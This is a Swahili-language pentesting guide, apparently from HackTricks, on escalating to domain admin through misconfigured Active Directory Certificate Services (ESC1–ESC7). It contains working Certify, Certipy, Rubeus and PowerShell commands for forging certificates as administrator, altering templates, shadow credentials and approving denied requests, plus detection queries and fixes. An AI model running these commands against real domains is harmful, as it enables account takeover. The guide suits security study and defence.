# Kuongeza Haki za Kikoa kupitia AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Huu ni muhtasari wa sehemu za mbinu za kuongeza haki katika machapisho haya:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Violezo vya Cheti Vilivyosanidiwa Vibaya - ESC1

### Maelezo

### Maelezo ya ESC1: Violezo vya Cheti Vilivyosanidiwa Vibaya

- **Enterprise CA huwapa watumiaji wenye haki ndogo ruhusa za kujiandikisha.**
- **Idhini ya msimamizi haihitajiki.**
- **Sahihi kutoka kwa wafanyakazi walioidhinishwa hazihitajiki.**
- **Vifafanuzi vya usalama kwenye violezo vya cheti vina ruhusa nyingi kupita kiasi, hivyo kuwaruhusu watumiaji wenye haki ndogo kupata ruhusa za kujiandikisha.**
- **Violezo vya cheti vimesanidiwa kufafanua EKU zinazowezesha uthibitishaji:**
  - Vitambulishi vya Extended Key Usage (EKU) kama Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), au kutokuwa na EKU (SubCA) vimejumuishwa.
- **Kiolezo kinaruhusu waombaji kujumuisha subjectAltName katika Certificate Signing Request (CSR):**
  - Active Directory (AD) hutanguliza subjectAltName (SAN) iliyo kwenye cheti kwa ajili ya kuthibitisha utambulisho. Hii inamaanisha kuwa kwa kubainisha SAN katika CSR, cheti kinaweza kuombwa ili kujifanya mtumiaji yeyote (kwa mfano, msimamizi wa kikoa). Ikiwa mwombaji anaweza kubainisha SAN huonyeshwa na sifa ya `mspki-certificate-name-flag` kwenye object ya AD ya kiolezo cha cheti. Sifa hii ni bitmask, na uwepo wa flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` huruhusu mwombaji kubainisha SAN.

> [!CAUTION]
> Mipangilio hii hutambua kiolezo kinachoweza kuwa cha ESC1, lakini haithibitishi kuwa njia ya kujifanya mtu mwingine imekamilika. Hakikisha principal lengwa inaweza kujiandikisha kwenye CA inayochapisha kiolezo, uandikishaji kwenye CA unaruhusiwa, na cheti kilichotolewa kinakidhi masharti madhubuti ya ulinganishaji wa SID ya sehemu ya mwisho ya uthibitishaji. KDC za sasa zilizopatiwa viraka zinaweza kukataa UPN iliyoombwa ikiwa SID ya cheti hailingani na ya lengwa; tazama [mwongozo wa Microsoft kuhusu ulinganishaji wa vyeti](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Ruhusa za kujiandikisha zilizopewa **Domain Computers** zinaweza kufanya utambulisho wa kompyuta uliotayarishwa ustahiki hata kama mtumiaji wa awali hawezi kujiandikisha. Tathmini ruhusa za principal ya kompyuta kando. Kagua `msPKI-Minimal-Key-Size` kabla ya kutuma ombi: kiolezo kinachohitaji funguo za RSA za biti 4096 kitakataa chaguomsingi ya mteja ya biti 2048. SID lengwa iliyotolewa kwenye ombi inaweza kurekebisha kutolingana kwa SID ikiwa tu CA na KDC zinakubali cheti na ulinganishaji unaotokana nacho; flags za kiolezo wala ACE ya Enroll pekee hazithibitishi hilo.

Kipengele hiki huwashwa wakati mwingine ili kusaidia uundaji wa vyeti vya HTTPS au vya host papo hapo na bidhaa au huduma za deployment, au kutokana na kutoelewa jinsi kinavyofanya kazi.

Imebainika kuwa kuunda cheti kwa kutumia chaguo hili huonyesha onyo. Hali hii haitokei wakati kiolezo cha cheti kilichopo (kama kiolezo cha `WebServer`, ambacho `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewashwa) kinaponakiliwa na kisha kurekebishwa ili kijumuishe OID ya uthibitishaji.<sup>[[6]](#references)</sup>

### Matumizi Mabaya

Ili **kupata violezo vya cheti vilivyo hatarini**, unaweza kutekeleza:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Ili **kutumia vibaya athari hii ya kiusalama na kujifanya msimamizi**, mtu anaweza kuendesha:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Kisha unaweza kubadilisha **cheti kilichozalishwa kuwa umbizo la `.pfx`** na kukitumia **kuthibitisha utambulisho kupitia Rubeus au certipy** tena:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Binaries za Windows "Certreq.exe" na "Certutil.exe" zinaweza kutumika kutengeneza PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uhesabuji wa certificate templates ndani ya schema ya usanidi ya AD Forest, hasa zile zisizohitaji idhini au saini, zenye EKU ya Client Authentication au Smart Card Logon, na ambazo zimewashwa bendera ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, unaweza kufanywa kwa kutekeleza LDAP query ifuatayo:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Violezo vya Cheti Vilivyosanidiwa Vibaya - ESC2

### Maelezo

Hali ya pili ya matumizi mabaya ni tofauti kidogo na ya kwanza:

1. Enterprise CA inawapa watumiaji wenye ruhusa za chini haki za kujiandikisha.
2. Sharti la idhini ya msimamizi limezimwa.
3. Sharti la sahihi zilizoidhinishwa limeondolewa.
4. Kiolezo cha cheti kina security descriptor yenye ruhusa nyingi kupita kiasi, inayowapa watumiaji wenye ruhusa za chini haki za kujiandikisha kupata vyeti.
5. **Kiolezo cha cheti kimefafanuliwa kujumuisha Any Purpose EKU au kutokuwa na EKU.**

**Any Purpose EKU** humruhusu mshambulizi kupata cheti kwa **matumizi yoyote**, ikiwemo uthibitishaji wa mteja, uthibitishaji wa seva, kusaini msimbo, n.k. **Mbinu ileile iliyotumika kwa ESC3** inaweza kutumiwa kutumia vibaya hali hii.

Vyeti **visivyo na EKU**, ambavyo hufanya kazi kama vyeti vya subordinate CA, vinaweza kutumiwa vibaya kwa **matumizi yoyote** na pia **kutumika kusaini vyeti vipya**. Kwa hiyo, mshambulizi anaweza kubainisha EKU au sehemu zozote anazotaka kwenye vyeti vipya kwa kutumia cheti cha subordinate CA.

Hata hivyo, vyeti vipya vilivyoundwa kwa **uthibitishaji wa domain** havitafanya kazi ikiwa subordinate CA haijaaminiwa na object ya **`NTAuthCertificates`**, ambayo ndiyo mipangilio chaguomsingi. Pamoja na hayo, mshambulizi bado anaweza kuunda **vyeti vipya vyenye EKU yoyote** na thamani zozote za cheti. Vyeti hivi vinaweza **kutumiwa vibaya** kwa madhumuni mengi (k.m., kusaini msimbo, uthibitishaji wa seva, n.k.) na vinaweza kuathiri kwa kiasi kikubwa programu nyingine kwenye mtandao kama vile SAML, AD FS, au IPSec.<sup>[[6]](#references)</sup>

Ili kutafuta violezo vinavyolingana na hali hii katika schema ya usanidi wa AD Forest, unaweza kutumia LDAP query ifuatayo:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Violezo vya Enrollment Agent Vilivyosanidiwa Vibaya - ESC3

### Maelezo

Hali hii ni kama ya kwanza na ya pili, lakini **inatumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templates 2 tofauti** (kwa hiyo ina seti 2 za mahitaji),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Enrollment Agent** katika nyaraka za Microsoft, humruhusu principal **kujisajili** kupata **cheti** kwa **niaba ya mtumiaji mwingine**.

**“Enrollment agent”** hujisajili kwenye **template** kama hiyo na kutumia **cheti kinachotokana na usajili huo kutia sahihi kwa pamoja CSR kwa niaba ya mtumiaji mwingine**. Kisha **hutuma** **CSR iliyotiwa sahihi kwa pamoja** kwa CA, na kujisajili kwenye **template** inayoruhusu **“kujisajili kwa niaba ya”** mtumiaji mwingine. CA hujibu kwa kutoa **cheti cha mtumiaji “mwingine”**.<sup>[[6]](#references)</sup>

**Mahitaji 1:**

- Enterprise CA huwapa watumiaji wenye haki za chini ruhusa za kujiandikisha.
- Sharti la idhini ya msimamizi limeondolewa.
- Hakuna sharti la sahihi zilizoidhinishwa.
- Security descriptor ya certificate template inaruhusu mambo mengi kupita kiasi, na kuwapa watumiaji wenye haki za chini ruhusa za kujiandikisha.
- Certificate template inajumuisha Certificate Request Agent EKU, inayowezesha kuomba vyeti kutoka kwa certificate templates nyingine kwa niaba ya principals wengine.

**Mahitaji 2:**

- Enterprise CA huwapa watumiaji wenye haki za chini ruhusa za kujiandikisha.
- Sharti la idhini ya msimamizi limeepukwa.
- Target template ya toleo la 1 inaweza kukubali enrollment agent bila vidhibiti vipya vya kina vya sera za utoaji; kwa toleo la 2 au jipya zaidi, tathmini mahitaji yake ya utoaji wa application-policy na sahihi zilizoidhinishwa badala ya kuiondoa template kwa kutegemea toleo lake pekee.
- EKU iliyofafanuliwa katika certificate template inaruhusu uthibitishaji wa domain.
- Vizuizi vya enrollment agents havijatumika kwenye CA.

Target template lazima pia ichapishwe na CA iliyochaguliwa, imruhusu akaunti lengwa kujiandikisha, na iauni matumizi yaliyokusudiwa ya uthibitishaji wa domain. Kagua sifa za subject/SAN zinazohitajika kwenye akaunti hiyo; kwa mfano, template inayounda subject email kutoka AD haiwezi kutoa cheti kwa akaunti isiyo na thamani ya `mail` inayohitajika. Cheti cha agent pekee hakitimizi masharti haya ya target template.

### Matumizi mabaya

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya hali hii:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Watumiaji** wanaoruhusiwa **kupata** **cheti cha enrollment agent**, templates ambazo **agents** wa enrollment wanaruhusiwa kujiandikisha nazo, na **akaunti** ambazo enrollment agent anaweza kuzitumia zinaweza kudhibitiwa na enterprise CAs. Hili hufanywa kwa kufungua snap-in ya `certsrc.msc`, **kubofya CA kwa kitufe cha kulia cha kipanya**, **kubofya Properties**, kisha **kwenda** kwenye kichupo cha “Enrollment Agents”.

Hata hivyo, imebainika kuwa mpangilio wa **chaguomsingi** wa CAs ni “**Do not restrict enrollment agents**.” Wasimamizi wanapowasha kizuizi kwa enrollment agents kwa kuweka mpangilio kuwa “Restrict enrollment agents,” usanidi wa chaguomsingi bado hauna vizuizi vya kutosha. Unaruhusu **Everyone** kujiandikisha katika templates zote kama mtu yeyote.

### PoCs za PowerShell za Windows pekee kwa kutumia Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) hutekeleza ESC1 na ESC2/ESC3 bila Certify au Certipy. Scripts zake huunda key ya RSA ya biti 2048 inayoweza kuhamishwa kwa kutumia X509Enrollment COM API, huunda ombi la PKCS#10, hutafuta `pKIEnrollmentService` ya kwanza kupitia LDAP, hulituma kupitia `CertificateAuthority.Request`, husakinisha jibu katika `Cert:\CurrentUser\My`, na kuhamisha PFX iliyosimbwa kwa Base64. Script ya ESC1 huongeza UPN SAN iliyochaguliwa na mshambulizi (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, thamani `0xb`), ilhali scripts za ESC2/ESC3 hutumia cheti cha kwanza kusaini ombi la PKCS#7 la on-behalf-of.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Scripts huchapisha Base64 ya **PFX**, inayojumuisha private key, kwa matumizi ya moja kwa moja na Rubeus. Usiibadilishe na `[Convert]::ToBase64String($cert.RawData)`: `RawData` husimba certificate ya umma pekee na haiwezi kusaini ombi la PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Udhibiti wa Ufikiaji Ulio Hatarini wa Kiolezo cha Cheti - ESC4

### **Maelezo**

**Descriptor ya usalama** kwenye **vielezo vya cheti** hufafanua **ruhusa** ambazo **principals za AD** wanazo kuhusiana na kiolezo hicho.

Iwapo **mshambuliaji** ana **ruhusa** zinazohitajika za **kubadilisha** **kiolezo** na **kuweka** **misconfigurations zinazoweza kutumiwa vibaya** zilizoelezwa katika **sehemu zilizotangulia**, anaweza kuwezesha kupandisha mamlaka.

Ruhusa muhimu zinazotumika kwa vielezo vya cheti ni pamoja na:<sup>[[6]](#references)</sup>

- **Owner:** Hutoa udhibiti wa moja kwa moja juu ya object, na kuruhusu kubadilisha attributes zozote.
- **FullControl:** Hutoa mamlaka kamili juu ya object, ikijumuisha uwezo wa kubadilisha attributes zozote.
- **WriteOwner:** Huruhusu kubadilisha mmiliki wa object na kumkabidhi principal anayemdhibiti mshambuliaji.
- **WriteDacl:** Huruhusu kurekebisha vidhibiti vya ufikiaji, na hivyo huenda kumpa mshambuliaji FullControl.
- **WriteProperty:** Huruhusu kuhariri properties zozote za object.

Pia kagua DACL kwenye kontena la `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. ACE ya `CreateChild` inayotumika na iliyowekewa upeo wa darasa la [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), au udhibiti mpana kamili, inaweza kutumika kuunda object mpya ya kiolezo. [Microsoft inaeleza](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) kwamba kontena hili huhifadhi objects hizi za kiolezo. Kagua ACE za deny zinazolingana na urithi kabla ya kuamua ikiwa uundaji huo utafanikiwa. Kiolezo kilichoundwa hakiwezi chenyewe kutoa cheti: CA lazima ichapishe kiolezo hicho, principal anayeomba lazima awe na ufikiaji wa enrollment, na cheti lazima kiunganishwe na utambulisho uliokusudiwa kwenye endpoint ya uthibitishaji.

### Matumizi Mabaya

Ili kutambua principals wenye haki za kuhariri vielezo na objects nyingine za PKI, fanya enumeration kwa kutumia Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Mfano wa privesc kama ule uliotangulia:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 hutokea mtumiaji anapokuwa na ruhusa za kuandika kwenye certificate template. Kwa mfano, hali hii inaweza kutumiwa vibaya kubadilisha usanidi wa certificate template na kuifanya iwe hatarini kwa ESC1.

Template ambayo tayari inamruhusu enrollee kutoa subject lakini ina matumizi ya Server Authentication pekee, si template ya kuingia kwa mtumiaji yenyewe. Ikiwa ana haki za udhibiti wa template zinazofanya kazi, mshambulizi anaweza kubadilisha EKUs zake za uthibitishaji au application policies kabla ya kuomba certificate; [Microsoft inaeleza madhumuni ya EKU ya Smartcard Logon ya kuingia](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Thibitisha kuwa CA inachapisha template iliyorekebishwa, mwombaji anaweza kujiandikisha, masharti ya idhini/sahihi yametimizwa, na certificate iliyotolewa inahusishwa na akaunti iliyokusudiwa. Hasa, [domain controller zilizowekwa viraka na kutumia Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) hukataa certificate zisizo na mapping thabiti; kuongeza UPN ya lengo kwenye ombi hakupitishi sharti hilo.

Kama tunavyoona kwenye njia iliyo hapo juu, `JOHNPC` pekee ndiye mwenye ruhusa hizi, lakini mtumiaji wetu `JOHN` ana edge mpya ya `AddKeyCredentialLink` kuelekea `JOHNPC`. Kwa kuwa mbinu hii inahusiana na certificate, nimeutekeleza pia shambulizi hili, linalojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Huu hapa ni muhtasari mfupi wa amri ya Certipy ya `shadow auto` ya kupata NT hash ya mwathiriwa.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** inaweza kubadilisha usanidi wa templeti ya cheti kwa amri moja. Kwa **chaguomsingi**, Certipy **hubadilisha** usanidi ili kuifanya **iwe hatarini kwa ESC1**. Tunaweza pia kubainisha **kigezo cha `-save-old` ili kuhifadhi usanidi wa awali**, ambacho kitatusaidia **kurejesha** usanidi baada ya shambulio letu.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Udhibiti wa Ufikiaji wa Kipengee cha PKI Kilicho Hatarini - ESC5

### Maelezo

Mtandao mpana wa mahusiano yanayotegemea ACL yaliyounganishwa, unaojumuisha vipengee kadhaa zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vipengee hivi, vinavyoweza kuathiri usalama kwa kiasi kikubwa, ni pamoja na:

- Kipengee cha kompyuta cha AD cha seva ya CA, ambacho kinaweza kuathiriwa kupitia mbinu kama S4U2Self au S4U2Proxy.
- Seva ya RPC/DCOM ya seva ya CA.
- Kipengee au kontena lolote la AD lililo chini ya njia mahususi ya kontena `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini haizuiliwi kwa, kontena na vipengee kama kontena la Certificate Templates, kontena la Certification Authorities, kipengee cha NTAuthCertificates, na Enrollment Services Container.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa mshambuliaji mwenye ruhusa ndogo atafanikiwa kudhibiti mojawapo ya vipengee hivi muhimu.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada inayojadiliwa katika [**chapisho la CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoelezwa na Microsoft. Mipangilio hii inapowashwa kwenye Certification Authority (CA), huruhusu kujumuishwa kwa **thamani zilizobainishwa na mtumiaji** katika **subject alternative name** kwa **ombi lolote**, ikijumuisha maombi yaliyoundwa kutoka Active Directory®. Kwa hiyo, mpangilio huu humwezesha **mvamizi** kujiandikisha kupitia **template yoyote** iliyowekwa kwa ajili ya **uthibitishaji** wa domain—hasa zile zilizo wazi kwa uandikishaji wa watumiaji **wasio na upendeleo**, kama template ya kawaida ya User. Kwa matokeo hayo, cheti kinaweza kupatikana na kumwezesha mvamizi kujithibitisha kama msimamizi wa domain au **huluki nyingine yoyote inayotumika** ndani ya domain.<sup>[[9]](#references)</sup>

**Kumbuka**: Mbinu ya kuongeza **majina mbadala** kwenye Certificate Signing Request (CSR), kwa kutumia hoja ya `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), **inatofautiana** na mkakati wa kutumia vibaya SAN katika ESC1. Tofauti hapa ni **jinsi maelezo ya akaunti yanavyofungashwa**—ndani ya sifa ya cheti, badala ya kiendelezi.

### Matumizi Mabaya

Ili kuthibitisha kama mpangilio huu umewashwa, mashirika yanaweza kutumia amri ifuatayo na `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Operesheni hii kimsingi hutumia **ufikiaji wa registry ya mbali**, kwa hivyo, njia mbadala inaweza kuwa:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zinaweza kugundua usanidi huu usio sahihi na ku-exploit:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Ili kubadilisha mipangilio hii, ikiwa mtu ana haki za **msimamizi wa domain** au sawa na hizo, amri ifuatayo inaweza kutekelezwa kutoka kwenye workstation yoyote:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Ili kuzima usanidi huu katika mazingira yako, flag inaweza kuondolewa kwa:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Baada ya masasisho ya usalama ya Mei 2022, **certificates** zitakazotolewa zitakuwa na **security extension** inayojumuisha sifa ya **`objectSid` ya mwombaji**. Kwa ESC1, SID hii hutokana na SAN iliyobainishwa. Hata hivyo, kwa **ESC6**, SID huakisi **`objectSid` ya mwombaji**, si SAN.\
> Ili kutumia ESC6, ni muhimu mfumo uwe katika hatari ya ESC10 (Weak Certificate Mappings), ambayo hutanguliza **SAN kuliko security extension mpya**.

## Udhibiti wa Ufikiaji wa Certificate Authority Ulio Hatarini - ESC7

### Shambulio la 1

#### Maelezo

Udhibiti wa ufikiaji wa certificate authority hudumishwa kupitia seti ya ruhusa zinazosimamia vitendo vya CA. Ruhusa hizi zinaweza kutazamwa kwa kufungua `certsrv.msc`, kubofya CA kwa kitufe cha kulia, kuchagua properties, kisha kwenda kwenye kichupo cha Security. Pia, ruhusa zinaweza kuorodheshwa kwa kutumia moduli ya PSPKI na amri kama vile:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Hii inatoa maarifa kuhusu haki kuu, yaani **`ManageCA`** na **`ManageCertificates`**, zinazolingana na majukumu ya “msimamizi wa CA” na “Msimamizi wa Vyeti” mtawalia.<sup>[[6]](#references)</sup>

#### Matumizi mabaya

Kuwa na haki za **`ManageCA`** kwenye mamlaka ya cheti humwezesha principal kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha au kuzima flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu kubainisha SAN katika template yoyote—jambo muhimu katika domain escalation.

Mchakato huu unaweza kurahisishwa kwa kutumia cmdlet ya **Enable-PolicyModuleFlag** ya PSPKI, inayoruhusu mabadiliko kufanywa bila kuhitaji kutumia GUI moja kwa moja.

Kuwa na haki za **`ManageCertificates`** huwezesha kuidhinisha maombi yanayosubiri, na hivyo kukwepa kinga ya “idhini ya msimamizi wa cheti cha CA”.

Mchanganyiko wa moduli za **Certify** na **PSPKI** unaweza kutumiwa kuomba, kuidhinisha na kupakua cheti:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Maelezo

> [!WARNING]
> Katika **shambulio lililotangulia**, ruhusa za **`Manage CA`** zilitumika **kuwezesha** flag ya **EDITF_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **shambulio la ESC6**, lakini hili halitakuwa na athari yoyote hadi huduma ya CA (`CertSvc`) iwashwe upya. Mtumiaji akiwa na haki ya ufikiaji ya `Manage CA`, pia anaruhusiwa **kuwasha upya huduma**. Hata hivyo, **haimaanishi kwamba mtumiaji anaweza kuwasha upya huduma kwa mbali**. Zaidi ya hayo, **ESC6 huenda isifanye kazi moja kwa moja** katika mazingira mengi yaliyowekewa viraka kutokana na masasisho ya usalama ya Mei 2022.

Kwa hiyo, shambulio jingine linaelezwa hapa.

Mahitaji ya awali:

- Ruhusa ya **`ManageCA`** pekee
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kupitia **`ManageCA`**)
- Kiolezo cha cheti **`SubCA`** lazima **kiwezeshwe** (kinaweza kuwezeshwa kupitia **`ManageCA`**)

Mbinu hii inategemea ukweli kwamba watumiaji wenye haki za ufikiaji za `Manage CA` _na_ `Manage Certificates` wanaweza **kuidhinisha maombi ya cheti yaliyokataliwa**. Kiolezo cha cheti cha **`SubCA`** **kina udhaifu wa ESC1**, lakini **wasimamizi pekee** ndio wanaoweza kujiandikisha kwenye kiolezo hicho. Kwa hiyo, **mtumiaji** anaweza **kuomba** kujiandikisha kwenye **`SubCA`** — ombi hilo **litakataliwa** — lakini **baadaye litaidhinishwa na msimamizi**.<sup>[[6]](#references)</sup>

#### Matumizi mabaya

Unaweza **kujipa mwenyewe haki ya ufikiaji ya `Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Kiolezo cha **`SubCA`** kinaweza **kuwezeshwa kwenye CA** kwa kutumia kigezo cha `-enable-template`. Kwa chaguomsingi, kiolezo cha `SubCA` kimewezeshwa.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Ikiwa tumetimiza masharti ya awali ya shambulizi hili, tunaweza kuanza kwa **kuomba cheti kwa kutumia template ya `SubCA`**.

**Ombi hili litakataliwa**, lakini tutahifadhi private key na kuandika ID ya ombi.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Kwa kutumia **`Manage CA` na `Manage Certificates`**, tunaweza **kutoa cheti kilichokataliwa** kwa ombi hilo kwa kutumia amri ya `ca` na kigezo cha `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

